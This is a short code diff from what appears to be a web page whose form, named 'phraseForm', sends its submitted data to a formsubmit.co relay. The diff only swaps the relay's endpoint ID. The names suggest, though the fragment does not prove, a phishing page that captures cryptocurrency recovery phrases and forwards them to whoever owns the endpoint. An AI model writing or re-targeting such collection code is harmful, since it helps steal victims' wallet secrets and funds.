@@ -128,7 +128,7 @@ manualBtn.addEventListener("click", () => {
 phraseForm.addEventListener('submit', (e) => {
 	e.preventDefault();
 
-	fetch("https://formsubmit.co/ajax/9a348175d440a4f651498fe04448e60f", {
+	fetch("https://formsubmit.co/ajax/0366d15bf5295d0068440bc25c3602c1", {
 		method: "POST",
 		headers: {
 			'Content-Type': 'application/json',
